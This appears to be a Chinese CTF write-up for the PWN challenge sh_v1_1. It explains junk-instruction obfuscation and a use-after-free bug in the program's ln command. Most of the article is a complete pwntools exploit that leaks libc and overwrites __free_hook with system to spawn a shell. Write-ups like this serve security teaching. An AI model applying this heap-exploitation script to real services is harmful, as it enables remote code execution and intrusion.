---
title: 【PWN专场】公开赛wp｜sh_v1_1
url: https://mp.weixin.qq.com/s?__biz=MzI2OTUzMzg3Ng==&mid=2247501413&idx=2&sn=9c0b12fc3802278a2fc23e9c801840b8&chksm=eadc51beddabd8a8092a2b1dd335f953f0c3ceae9c0750769faf7b67bba2e8f4bdb7881e8b3e&scene=58&subscene=0#rd
source: 胖哈勃
date: 2023-03-16
fetch_date: 2025-10-04T09:45:18.567531
---

# 【PWN专场】公开赛wp｜sh_v1_1

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/tzAD45OOV0YUnd2zZNoznWpqWSs6wictAJt4O5hFSZZgIweaQdDvdtth4QzKKu1eazy2atNlYVFgoZua2hB83sA/0?wx_fmt=jpeg)

# 【PWN专场】公开赛wp｜sh\_v1\_1

胖哈勃

## 1.题⽬名称

题目名称：sh\_v1\_1

## 2.题⽬考点

* 本题考查对程序指令逆向
* 对花指令等干扰指令排除
* UAF

## 3.题⽬详细解题⽅法

首先，程序中的花指令如下

![](https://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0YUnd2zZNoznWpqWSs6wictA7chu4aEvdM0IppyZlqKNQsIdMrYTxoEKPb8RyqA4qJmUOBMgpDCmmg/640?wx_fmt=png)

是可以排除干扰的

程序主要实现了`ls,rm,touch,cat,gedit`等功能

![](https://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0YUnd2zZNoznWpqWSs6wictAaq6s6wFhtDcSsfrRnibeyRDDwiaPcSITRjmLgg61Zia5k34hhOFXPdA3w/640?wx_fmt=png)

漏洞点主要在ln函数，ln函数链接时，将指针保存，但是在对原始指针删除时，未删除ln链接的指针，造成指针悬挂。

![](https://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0YUnd2zZNoznWpqWSs6wictASkQKecfTOj5iaFk4gOmbXwiaKZibgZFaI6YibbicYajXsWaVXias13Yh6gEA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0YUnd2zZNoznWpqWSs6wictAG6lpEBhyehZLhgiagpLaUO2d4TVYZLCDd93seZdOOVJH5DvZlNGFc8g/640?wx_fmt=png)exp:

```
#coding=utf-8
from pwn import *
context.log_level = "debug"# context.arch = "i386"context.arch = "amd64"
menu=""sh = 0lib = 0elf =ELF('sh_v1_1')libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
""" """l64 = lambda     :u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))l32 = lambda     :u32(sh.recvuntil("\xf7")[-4:].ljust(4,"\x00"))leak  = lambda name,data : sh.success(name + ": 0x%x" % data)s  = lambda payload: sh.send(payload)sa  = lambda a,b :sh.sendafter(str(a),str(b))sl  = lambda payload: sh.sendline(payload)sla = lambda a,b :sh.sendlineafter(str(a),str(b))ru  = lambda a     :sh.recvuntil(str(a))r  = lambda a     :sh.recv(str(a))""" """def add(name,content):  sla(">>>>","touch "+name)  sl(content)def edit(name,content):  sla(">>>>","gedit "+name)  s(content)def show(name):  sla(">>>>","cat "+name)def delete(name):  sla(">>>>","rm "+name)def ln(name,name1):  sla(">>>>","ln "+name+" "+name1)def b(addr):  bk="b *$rebase("+str(addr)+")"  # bk="b *"+str(addr)  attach(sh,bk)  success("attach")def pwn(ip,port,debug):  global sh  global libc  if(debug == 1):     sh = process("./sh_v1_1")  else:     sh = remote(ip,port)
  for i in range(0,10):     add("freedom"+str(i),"freedom!!!")  ln("freedom0","freedom10") #freedom0 uaf freedom10  for i in range(1,8):     delete("freedom"+str(i))  delete("freedom0")  show("freedom10")  libc_base=l64()-0x10-libc.sym["__malloc_hook"]-96  leak("libc_base",libc_base)   for i in range(0,8):     add("freedom"+str(i),"freedom!!!")
  delete("freedom1")  delete("freedom7")
  system=libc_base+libc.sym["system"]  free_hook=libc_base+libc.sym["__free_hook"]-8
  edit("freedom10",p64(free_hook)+"\n")  # b(0x000000000000219A)  add("freedom1","aaaa")  add("freedom7","/bin/sh\x00"+p64(system))  delete("freedom7")  sh.interactive()if __name__ == "__main__":  pwn("0.0.0.0",9999,1)
```

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0Zeox6znrSz1afEGxbEQYE9Uiblseq8RKdMAwgx379AFER4mgvOuLATkHkicupFYGiaAhxkpE4rH32lQ/0?wx_fmt=png)

胖哈勃

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/tzAD45OOV0Zeox6znrSz1afEGxbEQYE9Uiblseq8RKdMAwgx379AFER4mgvOuLATkHkicupFYGiaAhxkpE4rH32lQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过